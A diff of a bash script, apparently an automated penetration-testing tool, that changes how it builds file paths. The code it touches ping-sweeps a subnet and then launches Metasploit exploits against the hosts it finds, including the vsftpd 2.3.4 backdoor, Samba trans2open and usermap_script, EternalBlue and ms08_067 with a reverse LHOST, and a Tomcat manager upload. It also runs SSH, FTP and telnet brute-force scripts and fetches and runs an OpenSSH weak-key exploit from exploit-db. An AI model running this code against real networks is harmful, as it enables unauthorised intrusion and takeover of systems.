@@ -19,22 +19,22 @@ function updateOptWithVerbose() {
 }
 function self_update() {
 	pwd="$(pwd)"
-	cd $(dirname $0)
+	cd $dir_path
 	git fetch > /dev/null 2>&1
 	git reset --hard > /dev/null 2>&1
 	git pull > /dev/null 2>&1
-	chmod +x "$(basename $0)"
+	chmod +x "$full_path"
 	cd $pwd
 }
 function cleanning(){
-if [ -f $(dirname $0)/online.txt ] && [ -f $(dirname $0)/online.txt ]
+if [ -f $dir_path/online.txt ] && [ -f $dir_path/online.txt ]
 then
-	rm $(dirname $0)/online.txt
-	rm $(dirname $0)/urIp.txt
+	rm $dir_path/online.txt
+	rm $dir_path/urIp.txt
 fi
-if [ ! -d $(dirname $0)/exploits/ ]
+if [ ! -d $dir_path/exploits/ ]
 then
-	mkdir -p $(dirname $0)/exploits/{smb,ssh,ftp,apache,telnet}
+	mkdir -p $dir_path/exploits/{smb,ssh,ftp,apache,telnet}
 fi
 if [ -f report.html ]
 then
@@ -48,7 +48,7 @@ fi
 function vsftpd_234_backdoor(){
 	echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mBackdoor command execution\e[0m"
 	echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
-	cat <<- vsftpd_234_backdoor > $(dirname $0)/exploits/ftp/vsftpd_234_backdoor.rc
+	cat <<- vsftpd_234_backdoor > $dir_path/exploits/ftp/vsftpd_234_backdoor.rc
 		use exploit/unix/ftp/vsftpd_234_backdoor
 		set RHOSTS $ips
 		set LHOST $ip
@@ -57,9 +57,9 @@ function vsftpd_234_backdoor(){
 	sleep 40
 	if [ "$tmux" = "bash" ]
 	then
-		gnome-terminal -e "bash -c 'msfconsole -r $(dirname $0)/exploits/ftp/vsftpd_234_backdoor.rc; bash'" 2> /dev/null
+		gnome-terminal -e "bash -c 'msfconsole -r $dir_path/exploits/ftp/vsftpd_234_backdoor.rc; bash'" 2> /dev/null
 	else
-		tmux new-window -n vsftpdBackdoor "bash -c 'msfconsole -r $(dirname $0)/exploits/ftp/vsftpd_234_backdoor.rc; read; bash'" \; 2> /dev/null
+		tmux new-window -n vsftpdBackdoor "bash -c 'msfconsole -r $dir_path/exploits/ftp/vsftpd_234_backdoor.rc; read; bash'" \; 2> /dev/null
 	fi
 	description="A malicious backdoor that was added to the VSFTPD download archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between June 30th 2011 and July 1st 2011 according to the most recent information available. This backdoor was removed on July 3rd 2011."
 	remediation="It is recommended to update to the latest version."
@@ -68,7 +68,7 @@ function vsftpd_234_backdoor(){
 }
 function ftpAnonymous(){
 	echo -e "\e[1;34mChecking\e[0m if \e[1m$ips\e[1m is \e[1mvulnerable\e[0m to \e[1;91mftp anonoymous login\e[0m"
-	cat <<- ftpAnony > $(dirname $0)/exploits/ftp/ftpAnonymous.exp
+	cat <<- ftpAnony > $dir_path/exploits/ftp/ftpAnonymous.exp
 		#!/usr/bin/expect -f
 		spawn ftp $ips 
 		expect ": "
@@ -78,12 +78,12 @@ function ftpAnonymous(){
 		expect "ftp>"
 		interact
 	ftpAnony
-	chmod +x $(dirname $0)/exploits/ftp/ftpAnonymous.exp
+	chmod +x $dir_path/exploits/ftp/ftpAnonymous.exp
 	if [ "$tmux" = "bash" ]
 	then
-		gnome-terminal -e "bash -c 'expect $(dirname $0)/exploits/ftp/ftpAnonymous.exp; bash'" 2> /dev/null
+		gnome-terminal -e "bash -c 'expect $dir_path/exploits/ftp/ftpAnonymous.exp; bash'" 2> /dev/null
 	else
-		tmux new-window -n ftpAnonymous "bash -c 'expect $(dirname $0)/exploits/ftp/ftpAnonymous.exp; read; bash'" \; 2> /dev/null
+		tmux new-window -n ftpAnonymous "bash -c 'expect $dir_path/exploits/ftp/ftpAnonymous.exp; read; bash'" \; 2> /dev/null
 	fi
 	description="The remote FTP server allows anonymous logins. Anonymous FTP allows users without accounts to have restricted access to certain directories on the system. The configuration of systems allowing anonymous FTP should be checked carefully, as improperly configured FTP servers are frequently attacked."
 	remediation="If you are not using this service, it is recommended to disable it or at least deny anonymous logins."
@@ -120,7 +120,7 @@ function sshBruteForce(){
 			if [ "$username" != "" ] && [ "$password" != "" ]
 			then
 				echo -e "Username: \e[32m$username\e[0m Password: \e[32m$password\e[0m"
-				cat <<- sshlogin > $(dirname $0)/exploits/ssh/sshlogin$count.exp
+				cat <<- sshlogin > $dir_path/exploits/ssh/sshlogin$count.exp
 					#!/usr/bin/expect -f
 					spawn ssh $username@10.0.2.5 
 					expect {
@@ -135,12 +135,12 @@ function sshBruteForce(){
 					}
 					interact
 				sshlogin
-				chmod +x $(dirname $0)/exploits/ssh/sshlogin$count.exp
+				chmod +x $dir_path/exploits/ssh/sshlogin$count.exp
 				if [ "$tmux" = "bash" ]
 				then
-					gnome-terminal -e "bash -c 'expect $(dirname $0)/exploits/ssh/sshlogin$count.exp; bash'" \; 2> /dev/null
+					gnome-terminal -e "bash -c 'expect $dir_path/exploits/ssh/sshlogin$count.exp; bash'" \; 2> /dev/null
 				else
-					tmux split-window -t sshBruteForce "bash -c 'expect $(dirname $0)/exploits/ssh/sshlogin$count.exp; read; bash'" \; 2> /dev/null
+					tmux split-window -t sshBruteForce "bash -c 'expect $dir_path/exploits/ssh/sshlogin$count.exp; read; bash'" \; 2> /dev/null
 				fi
 			fi
 			((count++))
@@ -176,7 +176,7 @@ function ftpBruteForce(){
 			if [ "$username" != "" ] && [ "$password" != "" ]
 			then
 				echo -e "Username: \e[32m$username\e[0m Password: \e[32m$password\e[0m"
-				cat <<- ftplogin > $(dirname $0)/exploits/ftp/ftplogin$count.exp
+				cat <<- ftplogin > $dir_path/exploits/ftp/ftplogin$count.exp
 					#!/usr/bin/expect -f
 					spawn ftp 10.0.2.5 
 					expect {
@@ -192,12 +192,12 @@ function ftpBruteForce(){
 					expect "ftp>"
 					interact
 				ftplogin
-				chmod +x $(dirname $0)/exploits/ftp/ftplogin$count.exp
+				chmod +x $dir_path/exploits/ftp/ftplogin$count.exp
 				if [ "$tmux" = "bash" ]
 				then
-					gnome-terminal -e "bash -c 'expect $(dirname $0)/exploits/ftp/ftplogin$count.exp; bash'" \; 2> /dev/null
+					gnome-terminal -e "bash -c 'expect $dir_path/exploits/ftp/ftplogin$count.exp; bash'" \; 2> /dev/null
 				else
-					tmux split-window -t ftpBruteForce "bash -c 'expect $(dirname $0)/exploits/ftp/ftplogin$count.exp; read; bash'" \; 2> /dev/null
+					tmux split-window -t ftpBruteForce "bash -c 'expect $dir_path/exploits/ftp/ftplogin$count.exp; read; bash'" \; 2> /dev/null
 				fi
 			fi
 			((count++))
@@ -231,7 +231,7 @@ function telnetBruteForce(){
 			if [ "$username" != "" ] && [ "$password" != "" ]
 			then
 				echo -e "Username: \e[32m$username\e[0m Password: \e[32m$password\e[0m"
-				cat <<- telnetlogin > $(dirname $0)/exploits/telnet/telnetlogin$count.exp
+				cat <<- telnetlogin > $dir_path/exploits/telnet/telnetlogin$count.exp
 					#!/usr/bin/expect -f
 					spawn ftp 10.0.2.5 
 					expect {
@@ -247,12 +247,12 @@ function telnetBruteForce(){
 					expect "ftp>"
 					interact
 				telnetlogin
-				chmod +x $(dirname $0)/exploits/telnet/telnetlogin$count.exp
+				chmod +x $dir_path/exploits/telnet/telnetlogin$count.exp
 				if [ "$tmux" = "bash" ]
 				then
-					gnome-terminal -e "bash -c 'expect $(dirname $0)/exploits/telnet/telnetlogin$count.exp; bash'" \; 2> /dev/null
+					gnome-terminal -e "bash -c 'expect $dir_path/exploits/telnet/telnetlogin$count.exp; bash'" \; 2> /dev/null
 				else
-					tmux split-window -t telnetBruteForce "bash -c 'expect $(dirname $0)/exploits/telnet/telnetlogin$count.exp; read; bash'" \; 2> /dev/null
+					tmux split-window -t telnetBruteForce "bash -c 'expect $dir_path/exploits/telnet/telnetlogin$count.exp; read; bash'" \; 2> /dev/null
 				fi
 			fi
 			((count++))
@@ -286,7 +286,7 @@ function smbBruteForce(){
 			if [ "$username" != "" ] && [ "$password" != "" ]
 			then
 				echo -e "Username: \e[32m$username\e[0m Password: \e[32m$password\e[0m"
-				cat <<- telnetlogin > $(dirname $0)/exploits/telnet/telnetlogin$count.exp
+				cat <<- telnetlogin > $dir_path/exploits/telnet/telnetlogin$count.exp
 					#!/usr/bin/expect -f
 					spawn ftp 10.0.2.5 
 					expect {
@@ -302,12 +302,12 @@ function smbBruteForce(){
 					expect "ftp>"
 					interact
 				telnetlogin
-				chmod +x $(dirname $0)/exploits/telnet/telnetlogin$count.exp
+				chmod +x $dir_path/exploits/telnet/telnetlogin$count.exp
 				if [ "$tmux" = "bash" ]
 				then
-					gnome-terminal -e "bash -c 'expect $(dirname $0)/exploits/telnet/telnetlogin$count.exp; bash'" \; 2> /dev/null
+					gnome-terminal -e "bash -c 'expect $dir_path/exploits/telnet/telnetlogin$count.exp; bash'" \; 2> /dev/null
 				else
-					tmux split-window -t telnetBruteForce "bash -c 'expect $(dirname $0)/exploits/telnet/telnetlogin$count.exp; read; bash'" \; 2> /dev/null
+					tmux split-window -t telnetBruteForce "bash -c 'expect $dir_path/exploits/telnet/telnetlogin$count.exp; read; bash'" \; 2> /dev/null
 				fi
 			fi
 			((count++))
@@ -317,17 +317,17 @@ function smbBruteForce(){
 function OpenSSH4_7p1(){
 	echo -e "$ips has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91m brute force attacks against cryptographic keys\e[0m"
     echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
-	if [ ! -f $(dirname $0)/exploits/ssh/5622.tar.bz2 ]
+	if [ ! -f $dir_path/exploits/ssh/5622.tar.bz2 ]
 	then
-		wget -q -P $(dirname $0)/exploits/ssh/ https://www.exploit-db.com/download/5632
-		wget -q -P $(dirname $0)/exploits/ssh/ https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/5622.tar.bz2
+		wget -q -P $dir_path/exploits/ssh/ https://www.exploit-db.com/download/5632
+		wget -q -P $dir_path/exploits/ssh/ https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/5622.tar.bz2
 		sleep 10
-	elif [ ! -d $(dirname $0)/exploits/ssh/rsa/ ]
+	elif [ ! -d $dir_path/exploits/ssh/rsa/ ]
 	then
-		tar -C $(dirname $0)/exploits/ssh/ -xjf $(dirname $0)/exploits/ssh/5622.tar.bz2
+		tar -C $dir_path/exploits/ssh/ -xjf $dir_path/exploits/ssh/5622.tar.bz2
 	fi
 	sleep 30
-	tmux new-window -n keysAttack "bash -c 'ruby $(dirname $0)/exploits/ssh/5632 $ips root $(dirname $0)/exploits/ssh/rsa/2048 > $ips/keys.txt; read; bash'" \; 2> /dev/null
+	tmux new-window -n keysAttack "bash -c 'ruby $dir_path/exploits/ssh/5632 $ips root $dir_path/exploits/ssh/rsa/2048 > $ips/keys.txt; read; bash'" \; 2> /dev/null
 	sleep 20
 	grep -v -e 'testing' -e 'KEYFILE' $ips/keys.txt > $ips/key.txt
 	sleep 2
@@ -354,7 +354,7 @@ function OpenSSH4_7p1(){
 function trans2open(){
 	echo -e "\e[1m$ips\e[0m has \e[1m$smbVersion\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mbuffer overflow\e[0m"
 	echo -e "\e[1;91mExploiting\e[0m \e[1m$smbVersion\e[0m is in progress"
-	cat <<- trans2open > $(dirname $0)/exploits/smb/trans2open.rc
+	cat <<- trans2open > $dir_path/exploits/smb/trans2open.rc
 		use exploit/linux/samba/trans2open
 		set RHOSTS $ips
 		set LHOST $ip
@@ -364,10 +364,10 @@ function trans2open(){
 	sleep 40
 	if [ "$tmux" = "bash" ]
 	then
-		gnome-terminal -e "bash -c 'msfconsole -r $(dirname $0)/exploits/smb/trans2open.rc; bash'" 2> /dev/null
+		gnome-terminal -e "bash -c 'msfconsole -r $dir_path/exploits/smb/trans2open.rc; bash'" 2> /dev/null
 		sleep 30
 	else
-		tmux new-window -n trans2open "bash -c 'msfconsole -r $(dirname $0)/exploits/smb/trans2open.rc; read; bash'" \; 2> /dev/null
+		tmux new-window -n trans2open "bash -c 'msfconsole -r $dir_path/exploits/smb/trans2open.rc; read; bash'" \; 2> /dev/null
 		sleep 30
 	fi
 	description="Buffer overflow found in Samba versions 2.2.0 to 2.2.8. This particular module is capable of exploiting the flaw on x86 Linux systems that do not have the noexec stack option set. NOTE: Some older versions of RedHat do not seem to be vulnerable since they apparently do not allow anonymous access to IPC. "
@@ -382,7 +382,7 @@ function trans2open(){
 function usermap_script(){
 	echo -e "\e[1m$ips\e[0m has \e[1m$smbVersion\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mcommand execution\e[0m"
 	echo -e "\e[1;91mExploiting\e[0m \e[1m$smbVersion\e[0m is in progress"
-	cat <<- usermap_script > $(dirname $0)/exploits/smb/usermap_script.rc
+	cat <<- usermap_script > $dir_path/exploits/smb/usermap_script.rc
 		use exploit/multi/samba/usermap_script
 		set RHOSTS $ips
 		set LHOST $ip
@@ -391,10 +391,10 @@ function usermap_script(){
 	sleep 40
 	if [ "$tmux" = "bash" ]
 	then
-		gnome-terminal -e "bash -c 'msfconsole -r $(dirname $0)/exploits/smb/usermap_script.rc; bash'" 2> /dev/null
+		gnome-terminal -e "bash -c 'msfconsole -r $dir_path/exploits/smb/usermap_script.rc; bash'" 2> /dev/null
 		sleep 10
 	else
-		tmux new-window -n usermap_script "bash -c 'msfconsole -r $(dirname $0)/exploits/smb/usermap_script.rc; read; bash'" \; 2> /dev/null
+		tmux new-window -n usermap_script "bash -c 'msfconsole -r $dir_path/exploits/smb/usermap_script.rc; read; bash'" \; 2> /dev/null
 		sleep 10
 	fi
 	description="This bug was originally reported against the anonymous calls
@@ -427,7 +427,7 @@ function ms17_010_eternalblue(){
 		echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mbuffer overflow\e[0m"
 		echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
 	fi
-	cat <<- ms17_010_eternalblue > $(dirname $0)/exploits/smb/ms17_010_eternalblue.rc
+	cat <<- ms17_010_eternalblue > $dir_path/exploits/smb/ms17_010_eternalblue.rc
 		use exploit/windows/smb/ms17_010_eternalblue
 		set RHOSTS $ips
 		set LHOST $ip
@@ -437,10 +437,10 @@ function ms17_010_eternalblue(){
 	sleep 40
 	if [ "$tmux" = "bash" ]
 	then
-		gnome-terminal -e "bash -c 'msfconsole -r $(dirname $0)/exploits/smb/ms17_010_eternalblue.rc; bash'" 2> /dev/null
+		gnome-terminal -e "bash -c 'msfconsole -r $dir_path/exploits/smb/ms17_010_eternalblue.rc; bash'" 2> /dev/null
 		sleep 30
 	else
-		tmux new-window -n eternalblue "bash -c 'msfconsole -r $(dirname $0)/exploits/smb/ms17_010_eternalblue.rc; read; bash'" \; 2> /dev/null
+		tmux new-window -n eternalblue "bash -c 'msfconsole -r $dir_path/exploits/smb/ms17_010_eternalblue.rc; read; bash'" \; 2> /dev/null
 		sleep 30
 	fi
 	description="There is a buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size is calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error where a DWORD is subtracted into a WORD. The kernel pool is groomed so that overflow is well laid-out to overwrite an SMBv1 buffer. Actual RIP hijack is later completed in srvnet!SrvNetWskReceiveComplete. This exploit, like the original may not trigger 100% of the time, and should be run continuously until triggered. It seems like the pool will get hot streaks and need a cool down period before the shells rain in again. The module will attempt to use Anonymous login, by default, to authenticate to perform the exploit. If the user supplies credentials in the SMBUser, SMBPass, and SMBDomain options it will use those instead. On some systems, this module may cause system instability and crashes, such as a BSOD or a reboot. This may be more likely with some payloads."
@@ -451,7 +451,7 @@ function ms17_010_eternalblue(){
 	notrternal=$(grep -oP '=\K[^-]+' $ips/notEternalBlue.txt|sed -n '/FAIL/p;1q')
 	if [ "$notEternal" = "but no session" ] || [ "$notrternal" = "FAIL" ]
 	then
-		cat <<- ms17_010_psexec > $(dirname $0)/exploits/smb/ms17_010_psexec.rc
+		cat <<- ms17_010_psexec > $dir_path/exploits/smb/ms17_010_psexec.rc
 			use exploit/windows/smb/ms17_010_psexec
 			set RHOSTS $ips
 			set LHOST $ip
@@ -461,10 +461,10 @@ function ms17_010_eternalblue(){
 		sleep 40
 		if [ "$tmux" = "bash" ]
 		then
-			gnome-terminal -e "bash -c 'msfconsole -r $(dirname $0)/exploits/smb/ms17_010_psexec.rc; bash'" 2> /dev/null
+			gnome-terminal -e "bash -c 'msfconsole -r $dir_path/exploits/smb/ms17_010_psexec.rc; bash'" 2> /dev/null
 			sleep 30
 		else
-			tmux new-window -n eternalRomance "bash -c 'msfconsole -r $(dirname $0)/exploits/smb/ms17_010_psexec.rc; read; bash'" \; 2> /dev/null
+			tmux new-window -n eternalRomance "bash -c 'msfconsole -r $dir_path/exploits/smb/ms17_010_psexec.rc; read; bash'" \; 2> /dev/null
 			sleep 30
 		fi
 	fi
@@ -483,7 +483,7 @@ function ms08_067_netapi(){
 		echo -e "\e[1m$ips\e[0m has \e[1m$smbVersion\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mparsing flaw\e[0m"
 		echo -e "\e[1;91mExploiting\e[0m \e[1m$smbVersion\e[0m is in progress"
 	fi
-	cat <<- ms08_067_netapi > $(dirname $0)/exploits/smb/ms08_067_netapi.rc
+	cat <<- ms08_067_netapi > $dir_path/exploits/smb/ms08_067_netapi.rc
 		use exploit/windows/smb/ms08_067_netapi
 		set RHOSTS $ips
 		set LHOST $ip
@@ -492,10 +492,10 @@ function ms08_067_netapi(){
 	sleep 40
 	if [ "$tmux" = "bash" ]
 	then
-		gnome-terminal -e "bash -c 'msfconsole -r $(dirname $0)/exploits/smb/ms08_067_netapi.rc; bash'" 2> /dev/null
+		gnome-terminal -e "bash -c 'msfconsole -r $dir_path/exploits/smb/ms08_067_netapi.rc; bash'" 2> /dev/null
 		sleep 30
 	else
-		tmux new-window -n netapi "bash -c 'msfconsole -r $(dirname $0)/exploits/smb/ms08_067_netapi.rc; read; bash'" \; 2> /dev/null
+		tmux new-window -n netapi "bash -c 'msfconsole -r $dir_path/exploits/smb/ms08_067_netapi.rc; read; bash'" \; 2> /dev/null
 		sleep 30
 	fi
 	description='The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary code via a crafted RPC request that triggers the overflow during path canonicalization, as exploited in the wild by Gimmiv.A in October 2008, aka "Server Service Vulnerability."'
@@ -504,7 +504,7 @@ function ms08_067_netapi(){
 	report2
 }
 function smbScan(){
-	cat <<- smbVersion > $(dirname $0)/exploits/smb/smb_version.rc
+	cat <<- smbVersion > $dir_path/exploits/smb/smb_version.rc
 		use auxiliary/scanner/smb/smb_version
 		set RHOSTS $ips
 		spool $ips/smbVersion.txt
@@ -514,9 +514,9 @@ function smbScan(){
 	sleep 40
 	if [ "$tmux" = "bash" ]
 	then
-		gnome-terminal -e "bash -c 'msfconsole -r $(dirname $0)/exploits/smb/smb_version.rc; exit; bash'" 2> /dev/null
+		gnome-terminal -e "bash -c 'msfconsole -r $dir_path/exploits/smb/smb_version.rc; exit; bash'" 2> /dev/null
 	else
-		tmux new-window -n smbScan "bash -c 'msfconsole -r $(dirname $0)/exploits/smb/smb_version.rc; exit; bash'" \; 2> /dev/null
+		tmux new-window -n smbScan "bash -c 'msfconsole -r $dir_path/exploits/smb/smb_version.rc; exit; bash'" \; 2> /dev/null
 	fi
 	sleep 30
 	smbVersion=$(cat $ips/smbVersion.txt |grep "Samba" |grep -oP '\(\K[^\)]+')
@@ -668,21 +668,21 @@ while getopts 'hzt:i:a:s:e' OPTION; do
   case "$OPTION" in
     h)
       echo "Usage:"
-      echo "    $(basename $0) <flag> <argument>"
+      echo "    $full_path <flag> <argument>"
       echo ""
       echo "Example:"
-      echo "    $(basename $0) -t 10.10.10.10"
+      echo "    $full_path -t 10.10.10.10"
       echo ""
       echo "Flages:"
-      echo "    $(basename $0) -h, --help     	  Display this help message."
-      echo "    $(basename $0) --update       	  Update tool."
-      echo "    $(basename $0)                	  Scan the entire network."
-      echo "    $(basename $0) -t		  Pass a specific target's IP."
-      echo "    $(basename $0) -t	          Pass mutipule targets' IPs. Ex: '10.10.10.10\n20.20.20.20'"
-      echo "    $(basename $0) -i                  To specify an interface."
-      echo "    $(basename $0) -a		  Pass attacker's IP."
-      echo "    $(basename $0) -s	          To specify subNetwork 10.10.10.10/24 or /23 etc."
-      echo "    $(basename $0) -e, --aggressive	  Enable aggressive port scan"
+      echo "    $full_path -h, --help     	  Display this help message."
+      echo "    $full_path --update       	  Update tool."
+      echo "    $full_path                	  Scan the entire network."
+      echo "    $full_path -t		  Pass a specific target's IP."
+      echo "    $full_path -t	          Pass mutipule targets' IPs. Ex: '10.10.10.10\n20.20.20.20'"
+      echo "    $full_path -i                  To specify an interface."
+      echo "    $full_path -a		  Pass attacker's IP."
+      echo "    $full_path -s	          To specify subNetwork 10.10.10.10/24 or /23 etc."
+      echo "    $full_path -e, --aggressive	  Enable aggressive port scan"
       exit 0;;
     z)
       updateOptWithVerbose; exit;;
@@ -698,75 +698,75 @@ while getopts 'hzt:i:a:s:e' OPTION; do
       aggressive=true;;
  	\?)
      echo "Invalid Option: -$OPTION" 1>&2
-     echo "Display help message: $(basename $0) -h" 1>&2
+     echo "Display help message: $full_path -h" 1>&2
      exit 1;;
   esac
 done
 shift "$(($OPTIND -1))"
-ip a |grep -oP 'inet \K[^ ]+'| cut -f1-1 -d"/"|sed -n '2{p;q}' > $(dirname $0)/urIp.txt
-ip="$(cat $(dirname $0)/urIp.txt)"
+ip a |grep -oP 'inet \K[^ ]+'| cut -f1-1 -d"/"|sed -n '2{p;q}' > $dir_path/urIp.txt
+ip="$(cat $dir_path/urIp.txt)"
 if [ "$target" != "" ] && [ "$interface" != "" ] && [ "$subNetwork" != "" ]
 then
-	ifconfig $interface| grep -oP 'inet \K[^ ]+' > $(dirname $0)/urIp.txt
-	ip="$(cat $(dirname $0)/urIp.txt)"
-	fping -a -g $target$subNetwork 2> /dev/null > $(dirname $0)/online.txt
+	ifconfig $interface| grep -oP 'inet \K[^ ]+' > $dir_path/urIp.txt
+	ip="$(cat $dir_path/urIp.txt)"
+	fping -a -g $target$subNetwork 2> /dev/null > $dir_path/online.txt
 	target=""
 	interface=""
 	subNetwork=""
 elif [ "$target" != "" ] && [ "$attacker" != "" ]
 then
-	echo -e "$target" > $(dirname $0)/online.txt
-	ips="$(cat $(dirname $0)/online.txt)"
-	echo -e "$attacker" > $(dirname $0)/urIp.txt
-	ip="$(cat $(dirname $0)/urIp.txt)"
+	echo -e "$target" > $dir_path/online.txt
+	ips="$(cat $dir_path/online.txt)"
+	echo -e "$attacker" > $dir_path/urIp.txt
+	ip="$(cat $dir_path/urIp.txt)"
 	target=""
 	attacker=""
 elif [ "$target" != "" ] && [ "$interface" != "" ]
 then
-	ifconfig $interface| grep -oP 'inet \K[^ ]+' > $(dirname $0)/urIp.txt
-	ip="$(cat $(dirname $0)/urIp.txt)"
-	echo -e "$target" > $(dirname $0)/online.txt
+	ifconfig $interface| grep -oP 'inet \K[^ ]+' > $dir_path/urIp.txt
+	ip="$(cat $dir_path/urIp.txt)"
+	echo -e "$target" > $dir_path/online.txt
 	target=""
 	interface=""
 elif [ "$subNetwork" != "" ] && [ "$interface" != "" ]
 then
-	ifconfig $interface| grep -oP 'inet \K[^ ]+' > $(dirname $0)/urIp.txt
-	ip="$(cat $(dirname $0)/urIp.txt)"
-	fping -a -g $ip$subNetwork 2> /dev/null > $(dirname $0)/online.txt
+	ifconfig $interface| grep -oP 'inet \K[^ ]+' > $dir_path/urIp.txt
+	ip="$(cat $dir_path/urIp.txt)"
+	fping -a -g $ip$subNetwork 2> /dev/null > $dir_path/online.txt
 	subNetwork=""
 	interface=""
 elif [ "$subNetwork" != "" ] && [ "$attacker" != "" ]
 then
-	ip="$(cat $(dirname $0)/urIp.txt)"
-	fping -a -g $attacker$subNetwork 2> /dev/null > $(dirname $0)/online.txt
+	ip="$(cat $dir_path/urIp.txt)"
+	fping -a -g $attacker$subNetwork 2> /dev/null > $dir_path/online.txt
 	subNetwork=""
 	attacker=""
 elif [ "$interface" != "" ] && [ "$attacker" != "" ]
 then
-	echo -e "$attacker" > $(dirname $0)/urIp.txt
-	ifconfig $interface| grep -oP 'inet \K[^ ]+' > $(dirname $0)/online.txt
-	ips="$(cat $(dirname $0)/online.txt)"
-	fping -a -g $ips/24 2> /dev/null > $(dirname $0)/online.txt
+	echo -e "$attacker" > $dir_path/urIp.txt
+	ifconfig $interface| grep -oP 'inet \K[^ ]+' > $dir_path/online.txt
+	ips="$(cat $dir_path/online.txt)"
+	fping -a -g $ips/24 2> /dev/null > $dir_path/online.txt
 	interface=""
 	attacker=""
 elif [ "$interface" != "" ]
 then
-	ifconfig $interface| grep -oP 'inet \K[^ ]+' > $(dirname $0)/urIp.txt
-	ip="$(cat $(dirname $0)/urIp.txt)"
-	fping -a -g $ip/24 2> /dev/null > $(dirname $0)/online.txt
+	ifconfig $interface| grep -oP 'inet \K[^ ]+' > $dir_path/urIp.txt
+	ip="$(cat $dir_path/urIp.txt)"
+	fping -a -g $ip/24 2> /dev/null > $dir_path/online.txt
 	interface=""
 elif [ "$target" != "" ]
 then
-	echo -e "$target" > $(dirname $0)/online.txt
-	ips="$(cat $(dirname $0)/online.txt)"
+	echo -e "$target" > $dir_path/online.txt
+	ips="$(cat $dir_path/online.txt)"
 	target=""
 else
-	fping -a -g $ip/24 2> /dev/null > $(dirname $0)/online.txt
-	ips="$(cat $(dirname $0)/online.txt)"
+	fping -a -g $ip/24 2> /dev/null > $dir_path/online.txt
+	ips="$(cat $dir_path/online.txt)"
 fi
 echo "Performing a ping sweep is in progress"
 echo -e "Your ip address is \e[1m$ip\e[0m"
-grep -vxFf $(dirname $0)/urIp.txt $(dirname $0)/online.txt > $(dirname $0)/tmp.txt; cat $(dirname $0)/tmp.txt > $(dirname $0)/online.txt; rm $(dirname $0)/tmp.txt
+grep -vxFf $dir_path/urIp.txt $dir_path/online.txt > $dir_path/tmp.txt; cat $dir_path/tmp.txt > $dir_path/online.txt; rm $dir_path/tmp.txt
 while read ips
 do
 	packets=$(ping -c 1 $ips|grep 64|cut -f1-2 -d' ')
@@ -775,11 +775,11 @@ do
 		echo -e "\e[1m$ips\e[0m is \e[1;34mOnline\e[0m"
 	else
 		echo -e "\e[1m$ips\e[0m is \e[1;91mOffline\e[0m"
-		sed -i "/$ips/d" $(dirname $0)/online.txt
+		sed -i "/$ips/d" $dir_path/online.txt
 	fi
-done < $(dirname $0)/online.txt
+done < $dir_path/online.txt
 echo "########################################"
-for ips in $(cat $(dirname $0)/online.txt)
+for ips in $(cat $dir_path/online.txt)
 do
 	if [ -d "$ips" ]
 	then
@@ -866,29 +866,29 @@ do
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mremote code execution\e[0m"
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
 					port="$(cat $ips/$ips.nmap | grep "Apache Tomcat/Coyote JSP engine"| cut -f1-1 -d/)"
-					if [ -f $(dirname $0)/exploits/apache/tomcat_mgr_login.txt ]
+					if [ -f $dir_path/exploits/apache/tomcat_mgr_login.txt ]
 					then
-						rm $(dirname $0)/exploits/apache/tomcat_mgr_login.txt
+						rm $dir_path/exploits/apache/tomcat_mgr_login.txt
 					fi
-					cat <<- tomcatScanner > $(dirname $0)/exploits/apache/tomcat_mgr_login.rc
+					cat <<- tomcatScanner > $dir_path/exploits/apache/tomcat_mgr_login.rc
 						use auxiliary/scanner/http/tomcat_mgr_login
 						set RHOSTS $ips
 						set RPORT $port
-						spool $(dirname $0)/exploits/apache/tomcat_mgr_login.txt
+						spool $dir_path/exploits/apache/tomcat_mgr_login.txt
 						run
 						exit
 					tomcatScanner
 					sleep 2
 					if [ "$tmux" = "bash" ]
 					then
-						gnome-terminal -e "bash -c 'msfconsole -r $(dirname $0)/exploits/apache/tomcat_mgr_login.rc; exit; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c 'msfconsole -r $dir_path/exploits/apache/tomcat_mgr_login.rc; exit; bash'" 2> /dev/null
 					else
-						tmux new-window -n tomcat_mgr_login "bash -c 'msfconsole -r $(dirname $0)/exploits/apache/tomcat_mgr_login.rc; exit; bash'" \; 2> /dev/null
+						tmux new-window -n tomcat_mgr_login "bash -c 'msfconsole -r $dir_path/exploits/apache/tomcat_mgr_login.rc; exit; bash'" \; 2> /dev/null
 					fi
 					sleep 30
-					user=$(cat $(dirname $0)/exploits/apache/tomcat_mgr_login.txt | grep "[+]" |cut -f6-6 -d' '|cut -f1-1 -d':')
-					pass=$(cat $(dirname $0)/exploits/apache/tomcat_mgr_login.txt | grep "[+]" |cut -f6-6 -d' '|cut -f2-2 -d':')
-					cat <<- tomcatExploit > $(dirname $0)/exploits/apache/tomcat_mgr_upload.rc
+					user=$(cat $dir_path/exploits/apache/tomcat_mgr_login.txt | grep "[+]" |cut -f6-6 -d' '|cut -f1-1 -d':')
+					pass=$(cat $dir_path/exploits/apache/tomcat_mgr_login.txt | grep "[+]" |cut -f6-6 -d' '|cut -f2-2 -d':')
+					cat <<- tomcatExploit > $dir_path/exploits/apache/tomcat_mgr_upload.rc
 						use exploit/multi/http/tomcat_mgr_upload
 						set RHOSTS $ips
 						set RPORT $port
@@ -900,14 +900,14 @@ do
 					sleep 2
 					if [ "$tmux" = "bash" ]
 					then
